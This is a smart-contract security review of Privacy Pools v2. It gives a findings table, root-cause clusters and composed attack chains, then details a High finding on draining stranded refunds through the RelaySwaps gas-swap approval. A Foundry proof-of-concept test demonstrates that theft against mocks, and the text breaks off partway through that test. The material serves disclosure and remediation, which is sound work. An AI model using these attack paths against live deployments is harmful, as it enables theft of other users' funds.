# Privacy Pools v2 — security review findings

*Consensys Diligence · minr vulnerability mining · `0xbow-io/v2-monorepo` @ `638bf8f4a0f4ef26761e439a338c8db6667dc30b` · scanned 2026-09-14 · 32 findings (1 High · 17 Medium · 14 Low) · ~$60k bounty potential*

## Project summary

32 findings: 1 High · 17 Medium · 14 Low. Reviewed at commit `638bf8f`.

Thirteen findings carry a runnable proof of concept, embedded in the finding along with the path to drop it at and the command to run it.

Two cross-cutting views are supplied alongside the findings.

**Root causes** tie findings that share one underlying defect, so a single fix closes the whole cluster. 6 clusters cover 14 of the 32 findings; the rest are independent and are left unlabelled.

**Kill chains** are the opposite view: 5 sets of otherwise separate findings that compose into an attack path worse than any one of them, usually because one finding supplies a precondition another was filed as merely waiting for. Each chain states its own realism, and the one chain whose composition is reasoned rather than demonstrated says so.

## Protocol summary

Privacy Pools v2 is a shielded-balance protocol. A user's funds are a **note** — a commitment sitting in a `PoolVault`'s Merkle tree of notes. Spending one means proving in zero knowledge that you control it, without revealing which note it is; the vault records a **nullifier** so the same note cannot be spent twice. Identity lives in a separate contract, the `Keystore`, whose own tree holds one leaf per registered account, and both spend paths — `transact`, the compliance-gated spend, and `ragequit`, the unconditional escape hatch — verify a Merkle-inclusion proof of the spender's keystore leaf.

Compliance is enforced off-chain by an **Association Set Provider** (ASP), which publishes the set of deposit labels it will vouch for. `transact` requires an ASP-approved label; `ragequit` deliberately does not, so a depositor can always exit their own note.

Around that core sit three services the findings reach into. A **relayer** submits withdrawals for users who hold no gas on the chain, taking a fee. `RelaySwaps` turns a withdrawal into a swap or a cross-chain bridge in the same transaction, including a "B2" leg that sells a slice of the withdrawn token for the native ETH a bridge needs as its messaging fee. And a `PPRouter` yield path deposits shielded principal into an ERC-4626 vault, with a native mode added at this commit that accepts and pays ETH directly rather than the wrapped token.

## Scope

Reviewed at `638bf8f4a0f4ef26761e439a338c8db6667dc30b`, the tip of `refs/heads/v2.0` — the commit that added native-token processing to `PPRouter`.

Production Solidity changed since the previous fix-review ref is exactly the five files in that commit: `PPRouter.sol`, `PPRouterFactory.sol`, `IPPRouter.sol`, `IPPRouterFactory.sol` and the new `IWETH9.sol`. The rest of the delta is TypeScript — `packages/swaps`, `packages/relayer`, `packages/sdk` — and the findings below range across all of it, the contracts, the circuits and the shipped deployment configuration.

## Trust assumptions

The review takes the following as given. A finding that violates one of these is a real bug; behaviour consistent with them is by-design and not a finding.

### Actors

- **Note owner / prover** — untrusted. Holds a keystore leaf and a note and can prove over it. This is the party the system exists to protect, and a note owner attacking *another* note owner is in scope.
- **Anyone** — untrusted, and the reachability of most of this set. Deposits are permissionless, and so is `PoolVault.deposit`, `RelaySwaps.execute` as a submitter, and every relayer HTTP surface.
- **Relayer** — *untrusted but bounded*. It submits on the user's behalf and is paid a fee; the bound is that every fund-routing field is committed in the proof context the user signed. The exceptions are where this set concentrates — the slippage floor on the yield route and the B2 gas-swap fields are not bound by that context.
- **Quote oracle** — semi-trusted, off-chain. The relayer's quote sizes the fee, the native gas, the swap value and the two calldata blobs *before* the user proves over them, and once proved they are irrevocable. Nothing on-chain re-derives a quote; the user's SDK is the only checker, and it validates 11 of the 14 routing fields.
- **ASP** — semi-trusted. It decides which labels are spendable through `transact`. It cannot block `ragequit`, which is the design's deliberate floor on its power.
- **Admin roles** (`default-admin`, `ops-admin`, `upgrader`, `pauser`, `entrypoint-manager`, the `RelaySwaps` allowlist owner) — trusted. A finding whose attacker *is* one of these is out of scope unless an unprivileged caller can reach the same effect.

### Trust boundaries

- **The proof context is the boundary.** `PoolVault` binds fund routing into the proof, so a submitter cannot redirect value. Findings here are the places a field escaped that binding, or the context turned out to commit less than assumed.
- `ragequit` **must always work.** It is deliberately not pausable and needs no ASP approval. Anything that can make an exit unprovable is a finding regardless of who caused it.
- **A nullifier retires a note once.** Anything that burns a nullifier before the value has provably landed, or that lets one note yield two, crosses this line.
- **The allowlist is the only gate on `RelaySwaps`.** It alone decides who receives the ERC-20 approval and the two blobs of calldata the contract never parses.

### Acknowledged residuals

- **Role concentration on Arbitrum and Base.** A single EOA holds `defaultAdmin`, `opsAdmin`, `upgrader`, `pauser`, `unpauser`, `entrypointManager` and `postman`, and owns the `RelaySwaps` allowlist. The deployment record describes that key as derived from a test private key. Findings are written against the intended split-role model, not against this state; several are materially worse under it.
- **The submitter-controlled slippage floor on the yield withdrawal** is recorded by the client as a candidate under review, not yet ratified, on the grounds that the exit is a deterministic ~1:1 redeem. That rationale is asset-specific and was never re-examined for the wrapped-native underlying this commit introduces.
- **No post-commit sponsor statement exists.** Every ratified deviation in the client's own register predates the reviewed commit, so nothing here is dismissed on an acknowledgement made after the fact.

## Findings

| # | Severity | Reachable by | Root cause | Finding |
| --- | --- | --- | --- | --- |
| 001 | High | unauthenticated | RC-02 | The B2 gas swap approves a caller-chosen amount, so a noteholder can drain funds stranded in `RelaySwaps` |
| 002 | Medium | unauthenticated | RC-01 | `checkLeg` ignores `substatus`, so a failed destination deposit is treated as dust worth the whole principal |
| 003 | Medium | unauthenticated | RC-01 | The relayer bridges its own tokens for an amount measured at a caller-chosen `dustRecipient` |
| 004 | Medium | unauthenticated | | A hostile withdrawal recipient burns roughly 45 times the gas `EvmQuoteService` priced the relay at |
| 005 | Medium | theoretical | | `FileStorageService` treats an unparseable store as empty, so the next write destroys every record in it |
| 006 | Medium | privileged | | An unverified association-set snapshot row writes the terminal `EXITED` status over a spendable note |
| 007 | Medium | unauthenticated | | Unguarded `markAwaitingDestination` lets a duplicate delivery rewind a `CONFIRMED` job into a second deposit |
| 008 | Medium | unauthenticated | | The rescue note is sized at the swept amount while `Entrypoint.deposit` pulls that amount plus the vetting fee |
| 009 | Medium | unauthenticated | RC-06 | A forged note payload in a one-wei deposit pins a victim's note-discovery sync cursor at the attacker's block |
| 010 | Medium | unauthenticated | RC-01 | The rescue sweep's work list is caller-extensible, ordered worst-first, and bounded by nothing |
| 011 | Medium | unauthenticated | | Behind the platform proxy every client shares one rate-limit bucket, so six requests a minute deny a relay route |
| 012 | Medium | authenticated | | The relayer signs bridge calldata from the quote provider without checking it against `approvedRouters` |
| 013 | Medium | theoretical | | A network switch after session build sends the deposit to the same address on another chain |
| 014 | Medium | unauthenticated | RC-02 | The B2 gas swap buys 2.10x the bridge fee, so 52.7% of the user's slice is swept to the relayer |
| 015 | Medium | privileged | RC-05 | The tree-size setters accept caps above the compiled circuit depth, a size no deployed circuit can prove against |
| 016 | Medium | unauthenticated | | The cross-chain reshield burns the nullifier before a destination deposit nothing on-chain verifies |
| 017 | Medium | unauthenticated | RC-04 | `PoolVault.deposit` accepts a proof bound to no chain and no vault, so one proof verifies in every deployment |
| 018 | Medium | privileged | | Note discovery queries the ASP once per held label, linking a shielded transfer's sender to its recipient |
| 019 | Low | unauthenticated | | One funded EOA can fill the `Keystore` registration cap for a few ETH, permanently ending onboarding |
| 020 | Low | unauthenticated | | Any address can evict a live `PoolVault` state root by advancing its 16-slot ring with 1-wei deposits |
| 021 | Low | unauthenticated | | `withNullifierLock` releases at broadcast rather than at inclusion, so a duplicate relay burns the relayer's gas |
| 022 | Low | theoretical | RC-03 | `prepareSwapQuote` accepts the zero address as `fallbackAddress`, which three sibling cross-chain paths reject |
| 023 | Low | privileged | | `_authorizeUpgrade` discards its argument, so one upgrade can move a proxy onto a foreign `ACCESS_ROUTER` |
| 024 | Low | authenticated | RC-03 | `submitSelfSubmitBatch` skips the target and selector check that both sibling submit sites apply before signing |
| 025 | Low | authenticated | RC-03 | `PoolSessionWithdrawAndSwap` never checks the quote's addresses against `approvedRouters` |
| 026 | Low | privileged | | The documented recovery from a frozen keystore mints a second nullifying key for every account |
| 027 | Low | theoretical | RC-06 | A payment that arrived on time becomes undiscoverable if the recipient scans late |
| 028 | Low | config-gated | | No shipped TypeScript path ever issues `approve(spender, 0)`, so mainnet USDT reverts on a residual allowance |
| 029 | Low | unauthenticated | RC-05 | No contract counts or bounds association-set labels against the 262,144 ceiling the transact circuits impose |
| 030 | Low | config-gated | | `RelayerInfo` carries one `processorAddress`, but the relayer calls the vault from three different addresses |
| 031 | Low | unauthenticated | RC-04 | `CryptoService` seals note payloads with no associated data, binding a ciphertext to no chain, vault or event |
| 032 | Low | config-gated | | The SDK and relayer both encode a 14-field `SwapRouting`, so the five live `RelaySwaps` that decode 11 revert |

## Root causes

32 findings → 24 root causes · top 6 fixes close 14 (44%) · + 18 standalone

### RC-01 — Dust-rescue request fields are never bound to the job being settled

Findings 002, 003, 010. The rescue request block arrives at relay time, outside the signed commitment. Its recipient, its measured amount and its work-list membership are all caller-supplied, and no site cross-checks any of them against the job whose dust is being swept or against the wallet that pays. The service therefore sizes and directs payouts from inputs the beneficiary controls.

**Fix:** Bind the rescue request to the job it settles: include the `dustRecipient` and the expected amount in the signed commitment, require the measured recipient to equal the relayer's own signer address, and derive work-list membership from job state rather than from caller-reachable rows.

### RC-02 — The B2 gas-swap amount is not derived from the bridge fee it pays

Findings 001, 014. The gas swap's input approval and its output target are both taken from caller-supplied routing rather than computed from the bridge fee actually owed. That single looseness both lets the approval reach a balance the caller did not deposit and leaves an over-bought remainder that the sweep hands to the relayer.

**Fix:** Compute the gas-swap input from the quoted bridge fee inside `execute`, approve exactly that amount for exactly that call, and return any unspent remainder to the user's own slice rather than to `dustRecipient`.

### RC-03 — Sibling session paths disagree on which preconditions they check

Findings 022, 024, 025. Each pool-session path re-implements its own precondition checks rather than sharing one guard. Three separate paths omit a check that their siblings perform: the zero-address test on `fallbackAddress`, the target-and-selector test before signing a batch, and the `approvedRouters` test on a quote's addresses. The defect is the duplication, not any one omission.

**Fix:** Factor the shared preconditions into a single validation helper and call it from every session path that builds or signs a route, so a check added once applies everywhere.

### RC-04 — No domain separator binds a proof or a ciphertext to its deployment

Findings 017, 031. Neither the circuits nor the note sealing carry a domain tag. Proofs take no chain id and no vault address as public signals, and note payloads are sealed with no associated data, so both artifacts are valid in any deployment that shares a verifying key or a viewing key.

**Fix:** Introduce one domain tag covering chain id, vault address and artifact purpose. Add it as a public signal to the circuits and as the AEAD associated data when sealing note payloads, and reject artifacts whose tag does not match the local deployment.

### RC-05 — On-chain bounds are not derived from the compiled circuit constants

Findings 015, 029. The depth limits the circuits hard-assert exist only inside the circuits. The contracts that govern the quantities those limits apply to, the tree-size setters and the association-set label count, carry either a lower bound only or no bound at all, so on-chain state can be moved past what any deployed circuit can prove against and nothing reports the approach.

**Fix:** Export the compiled circuit depths as on-chain constants and bound every setter and every label-count path against them, reverting rather than accepting a value no deployed circuit can satisfy.

### RC-06 — Note discovery permanently drops notes the owner can still spend

Findings 009, 027. Discovery advances and bounds its scan from state an attacker or an unlucky ordering can influence: the sync cursor is assigned with no monotonicity floor, and the scan range is bounded by a payment request's expiry rather than by the range actually unscanned. In both cases a note that exists on-chain stops being offered and is never revisited.

**Fix:** Make the sync cursor monotonic, never assigning a value below the current one, and derive every scan range from the last verified-scanned block rather than from request metadata.

## Kill chains

5 chains · 3 confirmed / 1 plausible · worst: High

### KC-01 — A reshield's own stranded refund becomes the balance the B2 gas swap drains

High, confirmed, reachable by unauthenticated. Chain: 016 (entry) → 001 (settlement).

A cross-chain reshield spends the nullifier on the source chain inside `RelaySwaps.execute` and forwards the money to the bridge. When the bridge refunds on the source chain, the refund lands in the `RelaySwaps` contract itself as the depositor, with the victim's note already burned; that balance is the only remaining representation of their money, and the delta-only dust sweep never touches it because it is captured in the pre-swap snapshot. Any ASP-approved noteholder in the same token then calls `execute` with a gas-swap routing sized to consume exactly that residual, converting it to native gas that the sweep forwards to their own `dustRecipient`. Their own leg completes normally, so nothing about the transaction looks abnormal. The first finding produces precisely the residual the second consumes, and both halves are live in the same function on BNB Smart Chain.

**Cut it at:** Track the contract's pre-existing input-token balance and refuse to approve more than the caller's own post-fee amount to the gas-swap router; this breaks the chain at its settlement step without waiting on a rescue path.

**Assumes:** The bridge's source-chain refund semantics are taken from the project's own failure-taxonomy documentation and from its measured dust-leftover observations.

### KC-02 — Permissionless keystore fill, then the only documented remedy freezes every registered user

High, confirmed, reachable by unauthenticated. Chain: 019 (entry) → 015 (amplifier) → 026 (settlement).

One funded EOA fills the keystore's lifetime registration cap for a few ETH, which ends onboarding but leaves existing users spending normally. That is the ceiling that kept the first finding bounded. At a saturated keystore, however, every value the tree-size setter will accept is strictly greater than the saturated size, and so raises the tree past the depth all deployed `transact` and `ragequit` circuits hard-assert. The operator, facing a pool that can no longer onboard, reaches for the one lever the interface documentation points at, and one root-liveness window later nobody can transact or ragequit, including through the unilateral exit the design leans on. The only recovery that fits inside that window repoints the vault at a fresh keystore, whose nullifying-key mapping is empty, which re-arms the write-once guard for every account that ever registered.

**Cut it at:** Bound the tree-size setters above by the depth the compiled circuits assert, which removes the trap the operator would otherwise walk into and leaves the fill as a bounded onboarding outage.

**Assumes:** The double-spend terminal reached through the fresh-keystore recovery is reasoned from the constraint and storage interaction rather than from a simulated migration, and is marked as the unproven leg; the chain is a proven permanent denial of service without it.

### KC-03 — Every idempotency gap in the rescue state machine multiplies one caller-sized payout

High, plausible, reachable by unauthenticated. Chain: 003 (entry) → 002 (enabler) → 010 (amplifier) → 007 (amplifier) → 012 (enabler).

The forwarding path measures the amount to bridge at an address the caller named and pays it out of the relayer's own signer wallet, so a single request already yields the caller their withdrawal plus a relayer-funded note. The status check that should have caught the failure case instead classifies a reverted destination deposit as dust worth the whole principal, which sets the size. The sweep's work list is caller-extensible and ordered largest-first, so the attacker's own entries lead every pass. The job state machine then supplies the multiplier: the awaiting-destination write carries no guard on the status it overwrites, so an at-least-once redelivery rewinds a finished job and the next sweep deposits again from the same shared wallet. Because the attacker owns both the job being redeposited and its recipient identifier, each repeat pays them rather than consuming an unrelated job's dust. The route the relayer finally signs is taken from the quote provider without an allowlist check, so the destination of those payments is not constrained either.

**Cut it at:** Make the job state machine's transitions idempotent and monotonic, so a redelivery cannot rewind a settled job; this removes the multiplier and leaves each link as a bounded single-request defect.

**Assumes:** The on-chain half is live today; the note-minting half runs in the dust-rescue service, which the project records as not yet deployed, so the full chain is live only once that service ships · [EXTERNAL] The bridge's reporting semantics for a reverted destination deposit are taken from the provider's documented status model.

### KC-04 — Note discovery is denied permanently, with no key knowledge and no on-chain cost

High, confirmed, reachable by unauthenticated. Chain: 009 (entry) → 031 (enabler) → 027 (amplifier).

Discovery ends each pass by assigning the sync cursor from the earliest unresolved block, and that assignment has no floor and no comparison against the current cursor. Anything that can place an entry on the unresolved list therefore owns the victim's cursor, and the value is persisted, so the effect survives restarts. A payload that decrypts but resolves to no on-chain commitment is exactly such an entry, and the viewing keys needed to construct one are public. Sealing note payloads with no associated data removes even that cost: a payload blob lifted from another deployment replays into the same sink with no key knowledge at all. The scan-range defect completes the picture from the other side, because a note missed once is bounded out of every later pass rather than revisited, so the denial does not need to be renewed.

**Cut it at:** Make the sync cursor monotonic, refusing any assignment below the current value; every feeder in this chain writes to that one sink.

### KC-05 — A proof valid in every deployment, presented against a root window the attacker controls

High, speculative, reachable by unauthenticated. Chain: 017 (entry) → 020 (amplifier).

No circuit takes a chain id or a vault address as a public signal, so a proof accepted in one deployment verifies unchanged in any other that shares the verifying key. Separately, the root buffer retains its last sixteen roots by operation count rather than by time, and every deposit advances it, so any address can evict the root an honest in-flight proof was built against for the price of sixteen one-wei deposits. Held together, an attacker chooses both which proofs are portable between deployments and which roots remain acceptable in the target one, so honest users are forced to regenerate against a window the attacker is advancing while foreign proofs remain valid throughout.

**Cut it at:** Add a domain tag covering chain id and vault address as a public signal, which removes the portability the chain depends on.

**Assumes:** No deployment pair sharing a verifying key and holding materially different value has been enumerated, so the economic case for the replay half is not established · The composition was derived from the two findings rather than from an executed experiment.

## Reading and triaging these findings

The files in this directory are the deliverable and can be read as they are. The same findings are reachable from the `minr-cli` client (Node 18 or newer):

```bash
npm i -g https://tintinweb.github.io/minr/cli/minr-cli-latest.tgz
minr-cli login
```

`list` shows the projects you can see, `status` shows where each stands, `get` prints a finding's body, `pull` writes findings out as local `.md` files, and `attach pull` downloads the proof-of-concept bundle. To write a verdict back, use `triage` with one of `fixed`, `false-positive`, `in-progress`, `wont-fix` or `open`. None of these files carries a `status:` field, so nothing here pre-empts your own triage.

**Attachments:** `poc-privacy-pools-v2-638bf8f.tgz` (36.1 KB)

## Detailed findings

### #001 — The B2 gas swap approves a caller-chosen amount, so a noteholder can drain funds stranded in `RelaySwaps`

**Severity:** High · **Location:** `packages/swaps/contracts/src/RelaySwaps.sol` · **Bug:** High · **Payout:** High · **Novelty:** NEW · **Reach:** PERM · **Root cause:** RC-02 (2 findings) · **Kill chain:** KC-01 · **Status:** Open

#### Description

A relayed withdraw-and-swap spends a user's note in the pool and hands the proceeds straight to a swap router in the same transaction, which either pays a recipient on this chain or bridges the money to another one. A bridge charges its messaging fee in native ETH, and an ERC-20 withdrawal brings none of that into the contract, so the step the code labels B2 sells a slice of the withdrawn token for ETH first, and the main swap then hands the rest to the bridge. Each of the two swaps is given an ERC-20 approval of its own.

When a bridge transfer fails, some bridges refund on the source chain to the depositor, which is `RelaySwaps` itself. That user's note was burned when the withdrawal ran, so the refunded tokens sitting in the contract are the only remaining representation of their money, and the contract's own dust sweep will not hand them back: it pays out only what the current call added to the balance. The design accepts this and names the remedy, calling the owner-only `rescue()` "the only exit path for async bridge refunds and stray transfers". So the stranded balance waits in the contract for an operator to return it.

**Where it breaks.** The gas swap is allowed to spend an amount that has nothing to do with the withdrawal it belongs to, against a balance that is not only the withdrawal's own:

- the approval is sized by `gasSwapMaxInput`, a routing field chosen by whoever built the withdrawal and compared against nothing in the contract;
- the tokens it can be spent against are the contract's whole balance of that token, which is this caller's proceeds plus every stranded refund sitting beside them.

So any holder of a note in the pool's currently approved association set, in that token, can sell another user's stranded refund for ETH in the course of an ordinary withdrawal of their own, and because nothing reverts and the event reports only the caller's own entitlement, the operator's manual rescue is a path the theft gets to first.

`RelaySwaps.execute` grants two independent ERC-20 approvals in a single call, and only the second one is tied to what the caller actually withdrew. The first belongs to the B2 gas swap, the step-9.5 block that mints the bridge's native messaging fee in-contract from the withdrawn input token:

```solidity
// RelaySwaps.execute — step 9.5, the B2 gas swap
if (_r.swapValue > 0) {
    uint256 _ethPreGasSwap = address(this).balance;
    _token.safeApprove(_r.approvalAddress, _r.gasSwapMaxInput);
    (bool _gasOk,) = _r.swapTarget.call(_r.gasSwapCalldata);
    require(_gasOk, RelaySwaps_SwapFailed());
    _token.safeApprove(_r.approvalAddress, 0);
    require(
        address(this).balance - _ethPreGasSwap >= _r.swapValue,
        RelaySwaps_GasSwapInsufficient()
    );
}
```

`gasSwapMaxInput` and `gasSwapCalldata` are both fields of the `SwapRouting` tuple that `execute` decodes out of `_transactParams.data`. Both are proof-bound by the context check in `PoolVault.transact`, `_proof.context() == uint256(keccak256(abi.encode(_transactParams, _noteData))) % SNARK_SCALAR_FIELD`. Proof-binding fixes the tuple to whatever the prover committed to, so the relayer cannot edit it, but it places no constraint at all on what the prover chooses to commit to, and the prover here is the attacker. Between that decode and `safeApprove(_r.approvalAddress, _r.gasSwapMaxInput)`, nothing compares `gasSwapMaxInput` against `_amount`, the `_proof.amountOut()` the caller withdrew, against `_amount - _r.feeAmount`, or against anything else. The router allowlist does not bound it either: the `approvedRouters[_r.swapTarget]` and `approvedRouters[_r.approvalAddress]` requires are checks on identity. They bind no selector, no pull size and no proceeds receiver, so a correctly configured allowlist holding the genuine LiFi Diamond is what makes the attack work.

The rest is arithmetic. Track the contract's balance of the input token through one `execute`, writing `g` for what the gas swap consumes:

| Point in `execute` | `_token.balanceOf(address(this))` |
| --- | --- |
| step 6 snapshot into `_inputBefore` | `_inputBefore` |
| after `POOL.transact` in step 8 | `_inputBefore + _amount` |
| after the step-9 fee payout | `_inputBefore + _amount - feeAmount` |
| after step 9.5 consumes `g` | `_inputBefore + _amount - feeAmount - g` |
| step 10 computes `_swapAmount = _amount - _r.feeAmount` | no `g` term anywhere in it |
| step 10 approves `_swapAmount` | a second, independent allowance |

The only place the contract ever compares a post-state balance against `_inputBefore` is in `_sweepDust`, and it is a payout gate rather than an assertion:

```solidity
// RelaySwaps._sweepDust — input-token branch
// Sweep input token dust (ERC20 only, delta only)
if (_inputToken != NATIVE_ASSET) {
    uint256 _inputNow = _inputToken.balanceOf(address(this));
    if (_inputNow > _inputBefore) {
        _inputToken.safeTransfer(_dustRecipient, _inputNow - _inputBefore);
    }
}
```

There is no symmetric branch. When the contract ends the call holding less of the token than it started with, nothing reverts and nothing observes it. `execute` does emit `Executed`, but it reports `_swapAmount`, the caller's own entitlement, so the event masks the deficit rather than recording it. `_sweepDust`'s NatSpec says the delta-only design exists "to avoid draining tokens from parallel executions", and that is accurate about the sweep itself: `execute` is `nonReentrant` with no batch or multicall path, so two executions' funds never coexist and the sweep never over-pays. It also records that this contract holds tokens which are not the current caller's. B2 left the sweep alone and opened the gap on the approval side instead.

The attack does not starve itself. The attacker sizes `gasSwapCalldata` so the gas swap consumes exactly `_inputBefore`, which leaves precisely `_amount - feeAmount` for step 10, and their own reshield then completes normally. They set `swapValue` to 1 wei so the `RelaySwaps_GasSwapInsufficient` check passes trivially, and they name their own address as the LiFi receiver inside the blob, or take the proceeds through `dustRecipient`, which `execute` validates only for non-zero via `RelaySwaps_ZeroDustRecipient`. The loot is bounded, and the bound is exactly `_inputBefore`: setting `gasSwapMaxInput = type(uint256).max` does not extract more, because the router's `transferFrom` reverts once the pull exceeds the balance. What is stealable is any stranded ERC-20 of a pool-enabled token, by any holder of an approved note in that token. The attack also needs an allowlisted router that sizes its `transferFrom` from a caller-supplied amount field rather than from its own accounting. The repository's own captured LiFi route fixture shows that both the pull size and the ETH destination are free fields of the real blob for the Diamond's gas-swap leg; whether the live facet honours a pull beyond the calling execution's own deposit is not exercised by any test here, and that step rests on upstream Diamond semantics.

That stranded balance is a documented steady state of this contract, not a hypothetical. `rescue()`'s NatSpec says pre-existing balances "are excluded from the delta-only sweep, making this the only exit path for async bridge refunds and stray transfers", and the Cross-Chain Failure Taxonomy in `docs/tech-design/sdk/withdraw-and-swap.md` describes where they come from: some bridges refund on the source chain to the depositor, which is `RelaySwaps`, "where funds are currently stuck". The victim's note was already nullified inside `POOL.transact` in their own earlier transaction, so those tokens are the only remaining representation of their money.

On the prerequisite, `execute` is `external payable nonReentrant` with no relayer gate, and `PoolVault.transact` only requires `_transactParams.processor == msg.sender`, which `RelaySwaps` satisfies. That makes the function open, but not the attacker anonymous: `PoolVault._validateAndVerify` requires `_proof.associationSetRoot() == $.aspRegistry.latestASPRoot()`, so the attacker must hold a note in the current approved association set, in the same token. The note can be any size, since all thirteen rows in `ChainAssetRegistry` (nine of them on mainnet, Arbitrum and Base) ship `minAmount: 1`. A rotation of that approved-set root invalidates an in-flight attempt and forces a re-prove, which is friction rather than a barrier.

Two written promises about this code are contradicted by it. The `gasSwapMaxInput` field comment in the `SwapRouting` struct states the field is an:

> "upper bound on input-token units the contract may approve for the gas swap (step 9.5) — bounds a subverted gasSwapCalldata to the SDK-sized slice, since the contract cannot parse aggregator calldata"

There is no SDK-sized slice on-chain, and the same untrusted party supplies both the bound and the calldata the bound is meant to constrain. The threat model behind that comment is a subverted quote server handing a blob to an honest user; it does not consider the user as an adversary toward other users' balances. The What Gets Proof-Bound section of `withdraw-and-swap.md` states the approval shape as:

> "`approvalAddress` receives the ERC20 approval (scoped to `_swapAmount`, reset to 0 in the same tx)"

The code grants two approvals, and the first is scoped to nothing. None of this needs a compromised aggregator, an upgraded facet, an admin error or any privileged actor; the only real gate is that a stranded balance is sitting in the contract when the attacker fires.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/swaps/contracts/src/RelaySwaps.sol#L349-L359
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/swaps/contracts/src/RelaySwaps.sol#L363-L381
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/swaps/contracts/src/RelaySwaps.sol#L426-L432
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/swaps/contracts/src/RelaySwaps.sol#L80-L82

#### Impact

The asset at risk is another user's money, and in the worst case it is all of it. A failed Leg-1 cross-chain reshield refunds to `RelaySwaps` on the source chain, so the stranded balance is that user's full withdrawn principal net of fee. Nothing caps it: `IEntrypoint.AssetConfig` has no `maxAmount` field, all thirteen `ChainAssetRegistry` rows ship `minAmount: 1` and `maxRelayFee: type(uint256).max`, and the relayer's B2 ceilings bound `swapValue` and `gasSwapMaxInput` but never the withdrawal. B2 exists for the L2 to Mainnet reshield corridor, the "move my whole position to Mainnet" case, so five and six figure strandings are ordinary rather than exotic.

The theft also front-runs the owner's only recovery path. `rescue()` has zero production call sites: a full-tree search for `.rescue(` returns only `RelaySwaps.rescue.t.sol`. Nothing in the tree watches the contract's balance: no keeper, no subgraph, no alert policy, no dashboard, and the one indexer integration reads keystore leaves only. The only refund signal in the system is LiFi's `getSwapStatus` `substatus`, whose sole production consumer, `DetectionService.checkLeg` in the dust-rescue service, maps `FAILED` to a failed job outcome without inspecting the source chain or triggering a rescue. The `IRelaySwaps` interface omits `rescue()` and the `Rescued` event, so an integrator building against it cannot see the recovery entrypoint. Detection realistically waits on a user's support ticket, hours to days, while the attacker polls a free `balanceOf` every block. A drained contract also reads as healthy: the full-flow case in `mainnet-relay-swaps.integration.test.ts` asserts `balanceOf(RelaySwaps) == 0` as the good post-state.

#### Proof of concept

The full test file is below. It drops into `packages/swaps/contracts/test/` and runs with no new scaffolding: `RelaySwapsTest`, `MockSwapper` and its `gasSwapToSender` / `reshieldBridge` entry points, and both `_buildTransactProof` and `_buildTransactParams` all come from the repository's own `test/RelaySwaps.t.sol` at this commit. Save it as `test/GasSwapApproval.t.sol` and run `forge test --match-path 'test/GasSwapApproval.t.sol'` from `packages/swaps/contracts`. All eight `test_*` cases pass at this commit.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.32;

import {RelaySwapsTest, MockERC20, MockSwapper} from "./RelaySwaps.t.sol";
import {RelaySwaps, IPool} from "../src/RelaySwaps.sol";
import {ProofLibV2} from "main_contracts_libs/ProofLibV2.sol";

/// @notice Stress-tests of the gas-swap approval claim.
contract GasSwapApprovalPoC is RelaySwapsTest {
    address internal attacker = makeAddr("attackerX");

    function _routing(
        uint256 _swapValue,
        uint256 _gasPull,
        uint256 _gasMaxInput,
        uint256 _gasEthOut,
        uint256 _mainPull,
        uint256 _mainEthRefund,
        address _dust
    ) internal view returns (RelaySwaps.SwapRouting memory _r) {
        _r = RelaySwaps.SwapRouting({
            swapTarget: address(swapper),
            approvalAddress: address(swapper),
            outputToken: address(usdc),
            recipient: address(0),
            feeRecipient: address(0),
            fallbackAddress: address(0),
            dustRecipient: _dust,
            feeAmount: 0,
            minOutputAmount: 0,
            nativeGas: 0,
            swapValue: _swapValue,
            gasSwapMaxInput: _gasMaxInput,
            gasSwapCalldata: abi.encodeCall(MockSwapper.gasSwapToSender, (address(usdc), _gasPull, _gasEthOut)),
            swapCalldata: abi.encodeCall(MockSwapper.reshieldBridge, (address(usdc), _mainPull, _mainEthRefund))
        });
    }

    /// Q5 KILLER TEST: the *realistic* attack shape. The gas swap eats ONLY the
    /// residual; the main bridge leg still pulls the full `_amount - feeAmount`.
    /// If step 10 reverts, the whole finding is self-defeating.
    function test_MainLegStillSucceeds_WhenGasSwapEatsOnlyResidual() public {
        uint256 _residual = 500_000;          // 0.5 USDC stranded
        usdc.mint(address(relaySwaps), _residual);

        uint256 _withdraw = 1_000_000;        // attacker's own note, 1 USDC
        usdc.mint(address(pool), _withdraw);

        // Realistic Mainnet-destination reshield: lzFee = 0.001 ETH.
        uint256 _lzFee = 0.001 ether;

        RelaySwaps.SwapRouting memory _r = _routing({
            _swapValue: _lzFee,
            _gasPull: _residual,              // pull EXACTLY the stranded balance
            _gasMaxInput: _residual,          // no on-chain relation to _amount
            _gasEthOut: 0.0015 ether,         // market value of 0.5 USDC-equivalent; > lzFee
            _mainPull: _withdraw,             // main leg pulls the FULL entitlement
            _mainEthRefund: 0,
            _dust: attacker
        });

        ProofLibV2.TransactProof memory _proof = _buildTransactProof(_withdraw, address(usdc));
        IPool.TransactParams memory _params = _buildTransactParams(address(relaySwaps), _r);

        uint256 _attackerBefore = attacker.balance;
        vm.prank(attacker);                   // NO access control on execute()
        relaySwaps.execute(_proof, _params, new IPool.NoteData[](0));

        // Main leg succeeded, attacker's principal bridged normally.
        assertEq(usdc.balanceOf(address(swapper)), _withdraw + _residual, "router received principal + residual");
        assertEq(usdc.balanceOf(address(relaySwaps)), 0, "stranded residual is gone");
        // Attacker pocketed gasSwap proceeds minus the fee actually forwarded.
        assertEq(attacker.balance - _attackerBefore, 0.0015 ether - _lzFee, "residual value swept to attacker");
    }

    /// Control: with NO residual, the same routing reverts -- proving the extra
    /// pull comes strictly out of the pre-existing balance, never the pool.
    function test_NoResidual_AttackReverts() public {
        uint256 _withdraw = 1_000_000;
        usdc.mint(address(pool), _withdraw);

        RelaySwaps.SwapRouting memory _r = _routing({
            _swapValue: 0.001 ether,
            _gasPull: 500_000,
            _gasMaxInput: 500_000,
            _gasEthOut: 0.0015 ether,
            _mainPull: _withdraw,
            _mainEthRefund: 0,
            _dust: attacker
        });

        ProofLibV2.TransactProof memory _proof = _buildTransactProof(_withdraw, address(usdc));
        IPool.TransactParams memory _params = _buildTransactParams(address(relaySwaps), _r);

        vm.prank(attacker);
        vm.expectRevert(RelaySwaps.RelaySwaps_SwapFailed.selector);
        relaySwaps.execute(_proof, _params, new IPool.NoteData[](0));
